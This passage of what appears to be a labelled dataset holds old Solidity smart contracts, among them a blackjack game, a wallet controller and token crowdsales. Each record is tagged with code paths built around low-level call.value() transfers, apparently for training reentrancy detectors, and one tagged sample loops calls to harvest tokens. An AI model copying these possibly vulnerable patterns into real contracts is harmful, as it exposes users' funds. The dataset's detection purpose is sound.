(openedGame.closed) throw; if (!openedGame.tick()) throw; if (openedGame.closed) recordEndedGame(gameID); } function recordEndedGame(uint gameID) private { GameLib.Game openedGame = games[gameID]; if(currentBankroll + openedGame.bet > openedGame.payout){ currentBankroll = currentBankroll + openedGame.bet - openedGame.payout; } blockjacklogs.recordLog( openedGame.gameID, openedGame.player, uint(openedGame.result), openedGame.payout, GameLib.countHand(openedGame.playerCards), GameLib.countHand(openedGame.houseCards) ); } function tickRequiredLog(GameLib.Game storage game) private { blockjacklogs.tickRequiredLog(game.gameID, game.player, game.actionBlock); } function gameState(uint i) constant returns (uint8[], uint8[], uint8, uint8, uint256, uint256, uint8, uint8, bool, uint256) { GameLib.Game game = games[i]; return ( game.houseCards, game.playerCards, GameLib.countHand(game.houseCards), GameLib.countHand(game.playerCards), game.bet, game.payout, uint8(game.state), uint8(game.result), game.closed, game.actionBlock ); } function setupTrustedAccounts() internal { isOwner[DX] = true; isOwner[DEV] = true; isOwner[ADMIN_CONTRACT] = true; } function changeDev(address newDev) only(DEV) { isOwner[DEV] = false; DEV = newDev; isOwner[DEV] = true; } function changeDX(address newDX) only(DX) { isOwner[DX] = false; DX = newDX; isOwner[DX] = true; } function changeAdminContract(address _new_admin_contract) only(ADMIN_CONTRACT) { isOwner[ADMIN_CONTRACT] = false; ADMIN_CONTRACT = _new_admin_contract; isOwner[ADMIN_CONTRACT] = true; } function setSettings(uint256 _min, uint256 _max, uint256 _maxBlockActions) only(ADMIN_CONTRACT) { minBet = _min; maxBet = _max; maxBlockActions = _maxBlockActions; } function registerOwner(address _new_watcher) only(ADMIN_CONTRACT) { isOwner[_new_watcher] = true; } function removeOwner(address _old_watcher) only(ADMIN_CONTRACT) { isOwner[_old_watcher] = false; } function stopBlockjack() onlyOwner { allowsNewGames = false; } function startBlockjack() only(ADMIN_CONTRACT) { allowsNewGames = true; } function addBankroll() only(DX) payable { initialBankroll += msg.value; currentBankroll += msg.value; } function remainingBankroll() constant returns (uint256) { return currentBankroll > initialBankroll ? initialBankroll : currentBankroll; } function removeBankroll() only(DX) { if (initialBankroll > currentBankroll - 5 ether && bankrollLockedUntil > now) throw; stopBlockjack(); if (currentBankroll > initialBankroll) { if (!DEV.send(currentBankroll - initialBankroll)) throw; } suicide(DX); contractCleared = true; } function migrateBlockjack() only(ADMIN_CONTRACT) { stopBlockjack(); if (currentBankroll > initialBankroll) { if (!ADMIN_CONTRACT.call.value(currentBankroll - initialBankroll)()) throw; } suicide(DX); } function shareProfits() onlyOwner { if (profitsLockedUntil > now) throw; if (currentBankroll <= initialBankroll) throw; uint256 profit = currentBankroll - initialBankroll; if (!ADMIN_CONTRACT.call.value(profit)()) throw; currentBankroll -= profit; bankrollLockedUntil = now + BANKROLL_LOCK_PERIOD; profitsLockedUntil = bankrollLockedUntil + BANKROLL_LOCK_PERIOD; } } "}
{"sol name": "12182_1.sol", "label": 0, "first path": "function transferEther(address to, uint256 amount) public returns (bool) { require(msg.sender == owner); return to.call.value(amount)(); function() public payable {} contract Controller is ControllerStorage, Ownable, HasWorkers { event CreatedUserWallet(address _wallet); event WithdrawEth(address _wallet, address _to, uint256 _amount); event WithdrawToken(address _token, address _wallet, address _to, uint256 _amount); event ChangedForward(address _old, address _new, address _operator); constructor() public { setForward(msg.sender); function executeTransaction(address destination, uint256 value, bytes memory _bytes) public onlyOwner returns (bool) { return destination.call.value(value)(_bytes); function withdrawEthBatch(Wallet[] wallets) public onlyWorker returns (bool) { uint256 size = wallets.length; uint256 balance; Wallet wallet; for (uint256 i = 0; i < size; i++) { wallet = wallets[i]; balance = wallet.balance; if (wallet.transferEther(this, balance)) { emit WithdrawEth(wallet, forward, balance); forward.call.value(address(this).balance)(); return true; ", "second path": "function transferEther(address to, uint256 amount) public returns (bool) { require(msg.sender == owner); return to.call.value(amount)(); function() public payable {} contract Controller is ControllerStorage, Ownable, HasWorkers { event CreatedUserWallet(address _wallet); event WithdrawEth(address _wallet, address _to, uint256 _amount); event WithdrawToken(address _token, address _wallet, address _to, uint256 _amount); event ChangedForward(address _old, address _new, address _operator); constructor() public { setForward(msg.sender); function executeTransaction(address destination, uint256 value, bytes memory _bytes) public onlyOwner returns (bool) { return destination.call.value(value)(_bytes); function withdrawEthBatch(Wallet[] wallets) public onlyWorker returns (bool) { uint256 size = wallets.length; uint256 balance; Wallet wallet; for (uint256 i = 0; i < size; i++) { wallet = wallets[i]; balance = wallet.balance; if (wallet.transferEther(this, balance)) { emit WithdrawEth(wallet, forward, balance); forward.call.value(address(this).balance)(); return true; ", "third path": "function transferEther(address to, uint256 amount) public returns (bool) { require(msg.sender == owner); return to.call.value(amount)(); function() public payable {} contract Controller is ControllerStorage, Ownable, HasWorkers { event CreatedUserWallet(address _wallet); event WithdrawEth(address _wallet, address _to, uint256 _amount); event WithdrawToken(address _token, address _wallet, address _to, uint256 _amount); event ChangedForward(address _old, address _new, address _operator); constructor() public { setForward(msg.sender); function executeTransaction(address destination, uint256 value, bytes memory _bytes) public onlyOwner returns (bool) { return destination.call.value(value)(_bytes); function withdrawEthBatch(Wallet[] wallets) public onlyWorker returns (bool) { uint256 size = wallets.length; uint256 balance; Wallet wallet; for (uint256 i = 0; i < size; i++) { wallet = wallets[i]; balance = wallet.balance; if (wallet.transferEther(this, balance)) { emit WithdrawEth(wallet, forward, balance); forward.call.value(address(this).balance)(); return true; ", "long path": "pragma solidity ^0.4.23; contract Ownable { address public owner; modifier onlyOwner() { require(msg.sender == owner); _; } constructor() public { owner = msg.sender; } function setOwner(address _owner) public onlyOwner returns (bool) { require(_owner != address(0)); owner = _owner; return true; } } interface TokenHandler { function handleTokens(Token _token) public returns (bool); } contract HasWorkers is Ownable { mapping(address => uint256) private workerToIndex; address[] private workers; event AddedWorker(address _worker); event RemovedWorker(address _worker); constructor() public { workers.length++; } modifier onlyWorker() { require(isWorker(msg.sender)); _; } modifier workerOrOwner() { require(isWorker(msg.sender) || msg.sender == owner); _; } function isWorker(address _worker) public view returns (bool) { return workerToIndex[_worker] != 0; } function allWorkers() public view returns (address[] memory result) { result = new address[](workers.length - 1); for (uint256 i = 1; i < workers.length; i++) { result[i - 1] = workers[i]; } } function addWorker(address _worker) public onlyOwner returns (bool) { require(!isWorker(_worker)); uint256 index = workers.push(_worker) - 1; workerToIndex[_worker] = index; emit AddedWorker(_worker); return true; } function removeWorker(address _worker) public onlyOwner returns (bool) { require(isWorker(_worker)); uint256 index = workerToIndex[_worker]; address lastWorker = workers[workers.length - 1]; workerToIndex[lastWorker] = index; workers[index] = lastWorker; workers.length--; delete workerToIndex[_worker]; emit RemovedWorker(_worker); return true; } } contract ControllerStorage { address public walletsDelegate; address public controllerDelegate; address public forward; uint256 public createdWallets; mapping(bytes32 => bytes32) public gStorage; } contract WalletStorage { address public owner; } contract DelegateProxy { function delegatedFwd(address _dst, bytes _calldata) internal { assembly { let result := delegatecall(sub(gas, 10000), _dst, add(_calldata, 0x20), mload(_calldata), 0, 0) let size := returndatasize let ptr := mload(0x40) returndatacopy(ptr, 0, size) switch result case 0 { revert(ptr, size) } default { return(ptr, size) } } } } contract DelegateProvider { function getDelegate() public view returns (address delegate); } contract ControllerProxy is ControllerStorage, Ownable, HasWorkers, DelegateProvider, DelegateProxy { function getDelegate() public view returns (address delegate) { delegate = walletsDelegate; } function setWalletsDelegate(address _delegate) public onlyOwner returns (bool) { walletsDelegate = _delegate; return true; } function setControllerDelegate(address _delegate) public onlyOwner returns (bool) { controllerDelegate = _delegate; return true; } function() public payable { if (gasleft() > 2400) { delegatedFwd(controllerDelegate, msg.data); } } } contract Token { function transfer(address _to, uint _value) returns (bool success); function transferFrom(address _from, address _to, uint256 _value) returns (bool success); function allowance(address _owner, address _spender) constant returns (uint256 remaining); function approve(address _spender, uint256 _value) returns (bool success); function increaseApproval (address _spender, uint _addedValue) public returns (bool success); function balanceOf(address tokenOwner) public constant returns (uint balance); } contract WalletProxy is WalletStorage, DelegateProxy { event ReceivedETH(address from, uint256 amount); constructor() public { owner = msg.sender; } function() public payable { if (msg.value > 0) { emit ReceivedETH(msg.sender, msg.value); } if (gasleft() > 2400) { delegatedFwd(DelegateProvider(owner).getDelegate(), msg.data); } } } contract Wallet is WalletStorage { function transferERC20Token(Token token, address to, uint256 amount) public returns (bool) { require(msg.sender == owner); return token.transfer(to, amount); } function transferEther(address to, uint256 amount) public returns (bool) { require(msg.sender == owner); return to.call.value(amount)(); } function() public payable {} } contract Controller is ControllerStorage, Ownable, HasWorkers { event CreatedUserWallet(address _wallet); event WithdrawEth(address _wallet, address _to, uint256 _amount); event WithdrawToken(address _token, address _wallet, address _to, uint256 _amount); event ChangedForward(address _old, address _new, address _operator); constructor() public { setForward(msg.sender); } function executeTransaction(address destination, uint256 value, bytes memory _bytes) public onlyOwner returns (bool) { return destination.call.value(value)(_bytes); } function setForward(address _forward) public onlyOwner returns (bool) { emit ChangedForward(forward, _forward, msg.sender); forward = _forward; return true; } function createWallets(uint256 number) public onlyWorker returns (bool) { for (uint256 i = 0; i < number; i++) { emit CreatedUserWallet(new WalletProxy()); } createdWallets += number; return true; } function withdrawEth(Wallet wallet) public onlyWorker returns (bool result) { uint256 balance = address(wallet).balance; result = wallet.transferEther(forward, balance); if (result) { emit WithdrawEth(wallet, forward, balance); } } function withdrawEthBatch(Wallet[] wallets) public onlyWorker returns (bool) { uint256 size = wallets.length; uint256 balance; Wallet wallet; for (uint256 i = 0; i < size; i++) { wallet = wallets[i]; balance = wallet.balance; if (wallet.transferEther(this, balance)) { emit WithdrawEth(wallet, forward, balance); } } forward.call.value(address(this).balance)(); return true; } function withdrawERC20(Token token, Wallet wallet) public onlyWorker returns (bool result) { uint256 balance = token.balanceOf(wallet); result = wallet.transferERC20Token(token, forward, balance); if (result) { emit WithdrawToken(token, wallet, forward, balance); } TokenHandler(forward).handleTokens(token); } function withdrawERC20Batch(Token token, Wallet[] wallets) public onlyWorker returns (bool) { uint256 size = wallets.length; uint256 balance; Wallet wallet; for (uint256 i = 0; i < size; i++) { wallet = wallets[i]; balance = token.balanceOf(wallet); if (wallet.transferERC20Token(token, forward, balance)) { emit WithdrawToken(token, wallet, forward, balance); } } TokenHandler(forward).handleTokens(token); return true; } function() public payable {} } "}
{"sol name": "32559_1.sol", "label": 0, "first path": "function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) { if(isContract(_to)) { require(Balances(balancesContract()).get(msg.sender) >= _value); Balances(balancesContract()).transfer(msg.sender, _to, _value); ContractReceiver receiver = ContractReceiver(_to); require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data)); Transfer(msg.sender, _to, _value); Transfer(msg.sender, _to, _value, _data); return true; } else { return transferToAddress(_to, _value, _data); ", "second path": "function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) { if(isContract(_to)) { require(Balances(balancesContract()).get(msg.sender) >= _value); Balances(balancesContract()).transfer(msg.sender, _to, _value); ContractReceiver receiver = ContractReceiver(_to); require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data)); Transfer(msg.sender, _to, _value); Transfer(msg.sender, _to, _value, _data); return true; } else { return transferToAddress(_to, _value, _data); ", "third path": "function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) { if(isContract(_to)) { require(Balances(balancesContract()).get(msg.sender) >= _value); Balances(balancesContract()).transfer(msg.sender, _to, _value); ContractReceiver receiver = ContractReceiver(_to); require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data)); Transfer(msg.sender, _to, _value); Transfer(msg.sender, _to, _value, _data); return true; } else { return transferToAddress(_to, _value, _data); ", "long path": "pragma solidity ^0.4.18; contract useContractWeb { ContractWeb internal web = ContractWeb(0x0); } contract Owned { address public owner = msg.sender; function transferOwner(address _newOwner) onlyOwner public returns (bool) { owner = _newOwner; return true; } modifier onlyOwner { require(msg.sender == owner); _; } } contract CheckPayloadSize { modifier onlyPayloadSize(uint256 _size) { require(msg.data.length >= _size + 4); _; } } contract CanTransferTokens is CheckPayloadSize, Owned { function transferCustomToken(address _token, address _to, uint256 _value) onlyPayloadSize(3 * 32) onlyOwner public returns (bool) { Token tkn = Token(_token); return tkn.transfer(_to, _value); } } contract SafeMath { function add(uint256 x, uint256 y) pure internal returns (uint256) { require(x <= x + y); return x + y; } function sub(uint256 x, uint256 y) pure internal returns (uint256) { require(x >= y); return x - y; } } contract CheckIfContract { function isContract(address _addr) view internal returns (bool) { uint256 length; if (_addr == address(0x0)) return false; assembly { length := extcodesize(_addr) } if(length > 0) { return true; } else { return false; } } } contract ContractReceiver { TKN internal fallback; struct TKN { address sender; uint256 value; bytes data; bytes4 sig; } function getFallback() view public returns (TKN) { return fallback; } function tokenFallback(address _from, uint256 _value, bytes _data) public returns (bool) { TKN memory tkn; tkn.sender = _from; tkn.value = _value; tkn.data = _data; uint32 u = uint32(_data[3]) + (uint32(_data[2]) << 8) + (uint32(_data[1]) << 16) + (uint32(_data[0]) << 24); tkn.sig = bytes4(u); fallback = tkn; return true; } } contract Token1st { address public currentTradingSystem; address public currentExchangeSystem; mapping(address => uint) public balanceOf; mapping(address => mapping (address => uint)) public allowance; mapping(address => mapping (address => uint)) public tradingBalanceOf; mapping(address => mapping (address => uint)) public exchangeBalanceOf; function getBalanceOf(address _address) view public returns (uint amount){ return balanceOf[_address]; } event Transfer (address _to, address _from, uint _decimalAmount); function transferDecimalAmountFrom(address _from, address _to, uint _value) public returns (bool success) { require(balanceOf[_from] - tradingBalanceOf[_from][currentTradingSystem] - exchangeBalanceOf[_from][currentExchangeSystem] >= _value); require(balanceOf[_to] + (_value) >= balanceOf[_to]); require(_value <= allowance[_from][msg.sender]); balanceOf[_from] -= _value; balanceOf[_to] += _value; allowance[_from][msg.sender] -= _value; Transfer(_to, _from, _value); return true; } function approveSpenderDecimalAmount(address _spender, uint _value) public returns (bool success) { allowance[msg.sender][_spender] = _value; return true; } } contract ContractWeb is CanTransferTokens, CheckIfContract { mapping(string => contractInfo) internal contracts; event ContractAdded(string _name, address _referredTo); event ContractEdited(string _name, address _referredTo); event ContractMadePermanent(string _name); struct contractInfo { address contractAddress; bool isPermanent; } function getContractAddress(string _name) view public returns (address) { return contracts[_name].contractAddress; } function isContractPermanent(string _name) view public returns (bool) { return contracts[_name].isPermanent; } function setContract(string _name, address _address) onlyPayloadSize(2 * 32) onlyOwner public returns (bool) { require(isContract(_address)); require(this != _address); require(contracts[_name].contractAddress != _address); require(contracts[_name].isPermanent == false); address oldAddress = contracts[_name].contractAddress; contracts[_name].contractAddress = _address; if(oldAddress == address(0x0)) { ContractAdded(_name, _address); } else { ContractEdited(_name, _address); } return true; } function makeContractPermanent(string _name) onlyOwner public returns (bool) { require(contracts[_name].contractAddress != address(0x0)); require(contracts[_name].isPermanent == false); contracts[_name].isPermanent = true; ContractMadePermanent(_name); return true; } function tokenSetup(address _Tokens1st, address _Balancecs, address _Token, address _Conversion, address _Distribution) onlyPayloadSize(5 * 32) onlyOwner public returns (bool) { setContract(\"Token1st\", _Tokens1st); setContract(\"Balances\", _Balancecs); setContract(\"Token\", _Token); setContract(\"Conversion\", _Conversion); setContract(\"Distribution\", _Distribution); return true; } } contract Balances is CanTransferTokens, SafeMath, useContractWeb { mapping(address => uint256) internal _balances; function get(address _account) view public returns (uint256) { return _balances[_account]; } function tokenContract() view public returns (address) { return web.getContractAddress(\"Token\"); } function Balances() public { _balances[msg.sender] = 190 * 1000000 * 1000000000000000000; } modifier onlyToken { require(msg.sender == tokenContract()); _; } function transfer(address _from, address _to, uint256 _value) onlyPayloadSize(3 * 32) onlyToken public returns (bool success) { _balances[_from] = sub(_balances[_from], _value); _balances[_to] = add(_balances[_to], _value); return true; } } contract Token is CanTransferTokens, SafeMath, CheckIfContract, useContractWeb { string public symbol = \"SHC\"; string public name = \"ShineCoin\"; uint8 public decimals = 18; uint256 public totalSupply = 190 * 1000000 * 1000000000000000000; mapping (address => mapping (address => uint256)) internal _allowance; event Approval(address indexed from, address indexed to, uint256 value); event Transfer(address indexed from, address indexed to, uint256 value); event Transfer(address indexed from, address indexed to, uint256 value, bytes indexed data); function balanceOf(address _account) view public returns (uint256) { return Balances(balancesContract()).get(_account); } function allowance(address _from, address _to) view public returns (uint256 remaining) { return _allowance[_from][_to]; } function balancesContract() view public returns (address) { return web.getContractAddress(\"Balances\"); } function Token() public { bytes memory empty; Transfer(this, msg.sender, 190 * 1000000 * 1000000000000000000); Transfer(this, msg.sender, 190 * 1000000 * 1000000000000000000, empty); } function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) { if(isContract(_to)) { require(Balances(balancesContract()).get(msg.sender) >= _value); Balances(balancesContract()).transfer(msg.sender, _to, _value); ContractReceiver receiver = ContractReceiver(_to); require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data)); Transfer(msg.sender, _to, _value); Transfer(msg.sender, _to, _value, _data); return true; } else { return transferToAddress(_to, _value, _data); } } function transfer(address _to, uint256 _value, bytes _data) onlyPayloadSize(3 * 32) public returns (bool success) { if(isContract(_to)) { return transferToContract(_to, _value, _data); } else { return transferToAddress(_to, _value, _data); } } function transfer(address _to, uint256 _value) onlyPayloadSize(2 * 32) public returns (bool success) { bytes memory empty; if(isContract(_to)) { return transferToContract(_to, _value, empty); } else { return transferToAddress(_to, _value, empty); } } function transferToAddress(address _to, uint256 _value, bytes _data) internal returns (bool success) { require(Balances(balancesContract()).get(msg.sender) >= _value); Balances(balancesContract()).transfer(msg.sender, _to, _value); Transfer(msg.sender, _to, _value); Transfer(msg.sender, _to, _value, _data); return true; } function transferToContract(address _to, uint256 _value, bytes _data) internal returns (bool success) { require(Balances(balancesContract()).get(msg.sender) >= _value); Balances(balancesContract()).transfer(msg.sender, _to, _value); ContractReceiver receiver = ContractReceiver(_to); receiver.tokenFallback(msg.sender, _value, _data); Transfer(msg.sender, _to, _value); Transfer(msg.sender, _to, _value, _data); return true; } function transferFrom(address _from, address _to, uint256 _value) onlyPayloadSize(3 * 32) public returns (bool) { bytes memory empty; require(_value > 0 && _allowance[_from][msg.sender] >= _value && Balances(balancesContract()).get(_from) >= _value); _allowance[_from][msg.sender] = sub(_allowance[_from][msg.sender], _value); if(msg.sender != _to && isContract(_to)) { Balances(balancesContract()).transfer(_from, _to, _value); ContractReceiver receiver = ContractReceiver(_to); receiver.tokenFallback(_from, _value, empty); } else { Balances(balancesContract()).transfer(_from, _to, _value); } Transfer(_from, _to, _value); Transfer(_from, _to, _value, empty); return true; } function approve(address _to, uint256 _value) onlyPayloadSize(2 * 32) public returns (bool) { _allowance[msg.sender][_to] = add(_allowance[msg.sender][_to], _value); Approval(msg.sender, _to, _value); return true; } } contract Conversion is CanTransferTokens, useContractWeb { function token1stContract() view public returns (address) { return web.getContractAddress(\"Token1st\"); } function tokenContract() view public returns (address) { return web.getContractAddress(\"Token\"); } function deposit() onlyOwner public returns (bool) { require(Token(tokenContract()).allowance(owner, this) > 0); return Token(tokenContract()).transferFrom(owner, this, Token(tokenContract()).allowance(owner, this)); } function convert() public returns (bool) { uint256 senderBalance = Token1st(token1stContract()).getBalanceOf(msg.sender); require(Token1st(token1stContract()).allowance(msg.sender, this) >= senderBalance); Token1st(token1stContract()).transferDecimalAmountFrom(msg.sender, owner, senderBalance); return Token(tokenContract()).transfer(msg.sender, senderBalance * 10000000000); } } contract Distribution is CanTransferTokens, SafeMath, useContractWeb { uint256 public liveSince; uint256 public withdrawn; function withdrawnReadable() view public returns (uint256) { return withdrawn / 1000000000000000000; } function secondsLive() view public returns (uint256) { if(liveSince != 0) { return now - liveSince; } } function allowedSince() view public returns (uint256) { return secondsLive() * 380265185769276972; } function allowedSinceReadable() view public returns (uint256) { return secondsLive() * 380265185769276972 / 1000000000000000000; } function stillAllowed() view public returns (uint256) { return allowedSince() - withdrawn; } function stillAllowedReadable() view public returns (uint256) { uint256 _1 = allowedSince() - withdrawn; return _1 / 1000000000000000000; } function tokenContract() view public returns (address) { return web.getContractAddress(\"Token\"); } function makeLive() onlyOwner public returns (bool) { require(liveSince == 0); liveSince = now; return true; } function deposit() onlyOwner public returns (bool) { require(Token(tokenContract()).allowance(owner, this) > 0); return Token(tokenContract()).transferFrom(owner, this, Token(tokenContract()).allowance(owner, this)); } function transfer(address _to, uint256 _value) onlyPayloadSize(2 * 32) onlyOwner public returns (bool) { require(stillAllowed() >= _value && _value > 0 && liveSince != 0); withdrawn = add(withdrawn, _value); return Token(tokenContract()).transfer(_to, _value); } function transferReadable(address _to, uint256 _value) onlyPayloadSize(2 * 32) onlyOwner public returns (bool) { require(stillAllowed() >= _value * 1000000000000000000 && stillAllowed() != 0 && liveSince != 0); withdrawn = add(withdrawn, _value * 1000000000000000000); return Token(tokenContract()).transfer(_to, _value * 1000000000000000000); } } "}
{"sol name": "35617_1.sol", "label": 0, "first path": "function buyRecipient(address recipient) duringCrowdSale payable { require(!halted); uint tokens = safeMul(msg.value, price(block.timestamp)); require(safeAdd(saleTokenSupply,tokens)<=coinAllocation ); balances[recipient] = safeAdd(balances[recipient], tokens); totalSupply = safeAdd(totalSupply, tokens); saleTokenSupply = safeAdd(saleTokenSupply, tokens); salesVolume = safeAdd(salesVolume, msg.value); if (!founder.call.value(msg.value)()) revert(); Buy(recipient, msg.value, tokens); function buy() payable { buyRecipient(msg.sender); function() payable { buyRecipient(msg.sender); function buy() payable { buyRecipient(msg.sender); function() payable { buyRecipient(msg.sender); ", "second path": "function buyRecipient(address recipient) duringCrowdSale payable { require(!halted); uint tokens = safeMul(msg.value, price(block.timestamp)); require(safeAdd(saleTokenSupply,tokens)<=coinAllocation ); balances[recipient] = safeAdd(balances[recipient], tokens); totalSupply = safeAdd(totalSupply, tokens); saleTokenSupply = safeAdd(saleTokenSupply, tokens); salesVolume = safeAdd(salesVolume, msg.value); if (!founder.call.value(msg.value)()) revert(); Buy(recipient, msg.value, tokens); function buy() payable { buyRecipient(msg.sender); function() payable { buyRecipient(msg.sender); function buy() payable { buyRecipient(msg.sender); function() payable { buyRecipient(msg.sender); ", "third path": "function buyRecipient(address recipient) duringCrowdSale payable { require(!halted); uint tokens = safeMul(msg.value, price(block.timestamp)); require(safeAdd(saleTokenSupply,tokens)<=coinAllocation ); balances[recipient] = safeAdd(balances[recipient], tokens); totalSupply = safeAdd(totalSupply, tokens); saleTokenSupply = safeAdd(saleTokenSupply, tokens); salesVolume = safeAdd(salesVolume, msg.value); if (!founder.call.value(msg.value)()) revert(); Buy(recipient, msg.value, tokens); function buy() payable { buyRecipient(msg.sender); function() payable { buyRecipient(msg.sender); function buy() payable { buyRecipient(msg.sender); function() payable { buyRecipient(msg.sender); ", "long path": "pragma solidity ^0.4.11; contract SafeMath { function safeMul(uint a, uint b) internal returns (uint) { uint c = a * b; assert(a == 0 || c / a == b); return c; } function safeSub(uint a, uint b) internal returns (uint) { assert(b <= a); return a - b; } function safeAdd(uint a, uint b) internal returns (uint) { uint c = a + b; assert(c>=a && c>=b); return c; } function safeDiv(uint a, uint b) internal returns (uint) { assert(b > 0); uint c = a / b; assert(a == b * c + a % b); return c; } } contract Token { uint256 public totalSupply; function balanceOf(address _owner) constant returns (uint256 balance); function transfer(address _to, uint256 _value) returns (bool success); function transferFrom(address _from, address _to, uint256 _value) returns (bool success); function approve(address _spender, uint256 _value) returns (bool success); function allowance(address _owner, address _spender) constant returns (uint256 remaining); event Transfer(address indexed _from, address indexed _to, uint256 _value); event Approval(address indexed _owner, address indexed _spender, uint256 _value); } contract StandardToken is Token { function transfer(address _to, uint256 _value) returns (bool success) { if (balances[msg.sender] >= _value && _value > 0) { balances[msg.sender] -= _value; balances[_to] += _value; Transfer(msg.sender, _to, _value); return true; } else { return false; } } function transferFrom(address _from, address _to, uint256 _value) returns (bool success) { if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) { balances[_to] += _value; balances[_from] -= _value; allowed[_from][msg.sender] -= _value; Transfer(_from, _to, _value); return true; } else { return false; } } function balanceOf(address _owner) constant returns (uint256 balance) { return balances[_owner]; } function approve(address _spender, uint256 _value) returns (bool success) { allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) constant returns (uint256 remaining) { return allowed[_owner][_spender]; } mapping (address => uint256) balances; mapping (address => mapping (address => uint256)) allowed; } contract MoldCoin is StandardToken, SafeMath { string public name = \"MOLD\"; string public symbol = \"MLD\"; uint public decimals = 18; uint public startDatetime; uint public firstStageDatetime; uint public secondStageDatetime; uint public endDatetime; address public founder; address public admin; uint public coinAllocation = 20 * 10**8 * 10**decimals; uint public angelAllocation = 2 * 10**8 * 10**decimals; uint public founderAllocation = 3 * 10**8 * 10**decimals; bool public founderAllocated = false; uint public saleTokenSupply = 0; uint public salesVolume = 0; uint public angelTokenSupply = 0; bool public halted = false; event Buy(address indexed sender, uint eth, uint tokens); event AllocateFounderTokens(address indexed sender, uint tokens); event AllocateAngelTokens(address indexed sender, address to, uint tokens); event AllocateUnsoldTokens(address indexed sender, address holder, uint tokens); modifier onlyAdmin { require(msg.sender == admin); _; } modifier duringCrowdSale { require(block.timestamp >= startDatetime && block.timestamp <= endDatetime); _; } function MoldCoin(uint startDatetimeInSeconds, address founderWallet) { admin = msg.sender; founder = founderWallet; startDatetime = startDatetimeInSeconds; firstStageDatetime = startDatetime + 120 * 1 hours; secondStageDatetime = firstStageDatetime + 240 * 1 hours; endDatetime = secondStageDatetime + 2040 * 1 hours; } function price(uint timeInSeconds) constant returns(uint) { if (timeInSeconds < startDatetime) return 0; if (timeInSeconds <= firstStageDatetime) return 15000; if (timeInSeconds <= secondStageDatetime) return 12000; if (timeInSeconds <= endDatetime) return 10000; return 0; } function buy() payable { buyRecipient(msg.sender); } function() payable { buyRecipient(msg.sender); } function buyRecipient(address recipient) duringCrowdSale payable { require(!halted); uint tokens = safeMul(msg.value, price(block.timestamp)); require(safeAdd(saleTokenSupply,tokens)<=coinAllocation ); balances[recipient] = safeAdd(balances[recipient], tokens); totalSupply = safeAdd(totalSupply, tokens); saleTokenSupply = safeAdd(saleTokenSupply, tokens); salesVolume = safeAdd(salesVolume, msg.value); if (!founder.call.value(msg.value)()) revert(); Buy(recipient, msg.value, tokens); } function allocateFounderTokens() onlyAdmin { require( block.timestamp > endDatetime ); require(!founderAllocated); balances[founder] = safeAdd(balances[founder], founderAllocation); totalSupply = safeAdd(totalSupply, founderAllocation); founderAllocated = true; AllocateFounderTokens(msg.sender, founderAllocation); } function allocateAngelTokens(address angel, uint tokens) onlyAdmin { require(safeAdd(angelTokenSupply,tokens) <= angelAllocation ); balances[angel] = safeAdd(balances[angel], tokens); angelTokenSupply = safeAdd(angelTokenSupply, tokens); totalSupply = safeAdd(totalSupply, tokens); AllocateAngelTokens(msg.sender, angel, tokens); } function halt() onlyAdmin { halted = true; } function unhalt() onlyAdmin { halted = false; } function changeAdmin(address newAdmin) onlyAdmin  { admin = newAdmin; } function arrangeUnsoldTokens(address holder, uint256 tokens) onlyAdmin { require( block.timestamp > endDatetime ); require( safeAdd(saleTokenSupply,tokens) <= coinAllocation ); require( balances[holder] >0 ); balances[holder] = safeAdd(balances[holder], tokens); saleTokenSupply = safeAdd(saleTokenSupply, tokens); totalSupply = safeAdd(totalSupply, tokens); AllocateUnsoldTokens(msg.sender, holder, tokens); } } contract MoldCoinBonus is SafeMath { function bonusBalanceOf(address _owner) constant returns (uint256 balance) { return bonusBalances[_owner]; } mapping (address => uint256) bonusBalances; address public admin; MoldCoin public fundAddress; uint public rate = 10; uint public totalSupply = 0; bool public halted = false; event BuyWithBonus(address indexed sender, address indexed inviter, uint eth, uint tokens, uint bonus); event BuyForFriend(address indexed sender, address indexed friend, uint eth, uint tokens, uint bonus); modifier onlyAdmin { require(msg.sender == admin); _; } modifier validSale { require(!halted); require(!fundAddress.halted()); _; } function MoldCoinBonus(MoldCoin _fundAddress, uint _rate) { admin = msg.sender; fundAddress = _fundAddress; rate = _rate; } function buyWithBonus(address inviter) validSale payable { require( msg.sender != inviter ); uint tokens = safeMul(msg.value, fundAddress.price(block.timestamp)); uint bonus = safeDiv(safeMul(tokens, rate), 100); fundAddress.buyRecipient.value(msg.value)(msg.sender); totalSupply = safeAdd(totalSupply, bonus*2); bonusBalances[inviter] = safeAdd(bonusBalances[inviter], bonus); bonusBalances[msg.sender] = safeAdd(bonusBalances[msg.sender], bonus); BuyWithBonus(msg.sender, inviter, msg.value, tokens, bonus); } function halt() onlyAdmin { halted = true; } function unhalt() onlyAdmin { halted = false; } function changeAdmin(address newAdmin) onlyAdmin  { admin = newAdmin; } function changeRate(uint _rate) onlyAdmin  { rate = _rate; } } "}
{"sol name": "25808_1.sol", "label": 1, "first path": "function getTokens(uint num, address addr) public { for(uint i = 0; i < num; i++){ addr.call.value(0 wei)(); ", "second path": "function getTokens(uint num, address addr) public { for(uint i = 0; i < num; i++){ addr.call.value(0 wei)(); ", "third path": "function getTokens(uint num, address addr) public { for(uint i = 0; i < num; i++){ addr.call.value(0 wei)(); ", "long path": "pragma solidity ^0.4.19; contract Token { function transfer(address _to, uint _value) returns (bool success); function balanceOf(address _owner) constant returns (uint balance); } contract EtherGet { address owner; function EtherGet() { owner = msg.sender; } function withdrawTokens(address tokenContract) public { Token tc = Token(tokenContract); tc.transfer(owner, tc.balanceOf(this)); } function withdrawEther() public { owner.transfer(this.balance); } function getTokens(uint num, address addr) public { for(uint i = 0; i < num; i++){ addr.call.value(0 wei)(); } } } "}
